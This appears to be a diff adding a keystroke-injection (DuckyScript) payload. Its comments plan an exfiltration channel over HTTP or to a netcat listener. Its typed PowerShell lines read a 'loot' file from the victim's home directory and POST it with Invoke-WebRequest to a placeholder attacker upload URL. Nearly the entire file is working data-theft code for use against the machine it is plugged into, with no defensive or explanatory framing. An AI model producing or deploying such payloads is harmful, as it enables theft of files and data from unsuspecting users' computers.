@@ -1,0 +1,11 @@
+REM should look into having an exfil method that sends data via http
+REM or to nc listener with signed or secret phrase to confirm its our beacon
+
+
+
+
+STRINGLN $L = ~/loot.txt
+STRINGLN $uri = "https://your-domain/upload"
+STRINGLN $file = "$L"
+STRINGLN $headers = @{"Content-Type" = "application/octet-stream";"User-Agent" = "YOURCOOKIEHERE"}
+STRINGLN Invoke-WebRequest -Uri $uri -Method Post -Body (Get-Content $file -Raw) -Headers $headers -TimeoutSec 10 
